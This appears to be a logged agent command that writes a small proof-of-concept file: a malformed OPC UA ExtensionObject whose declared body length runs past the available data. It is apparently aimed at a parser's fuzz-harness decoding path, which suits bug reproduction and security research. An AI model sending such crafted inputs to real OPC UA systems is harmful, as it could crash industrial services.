Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
# candidate: first two bytes typeIndex 21 ExtensionObject, then ExtensionObject with string NodeId ns0 string len1 'A', encoding bytestring, body length 100 no body, extra 4 bytes for tortureExtensionObject offset?
b=bytearray()
b += (21).to_bytes(2,'little')
b += bytes([0x03]) # NodeId string
b += (0).to_bytes(2,'little') # ns
b += (1).to_bytes(4,'little', signed=True)
b += b'A'
b += bytes([0x01]) # ExtensionObject encoded bytestring
b += (100).to_bytes(4,'little', signed=True) # body length too long
# add extra to have offset<size? No ret fail so offset remains? tortureEncoding returns TRUE even ret bad; offset only updated on success. newOffset starts 0. Then offset=0 < size, tortureExtensionObject uses from data[0]. OK.
Path('poc1.bin').write_bytes(b)
print(len(b), b.hex())
PY
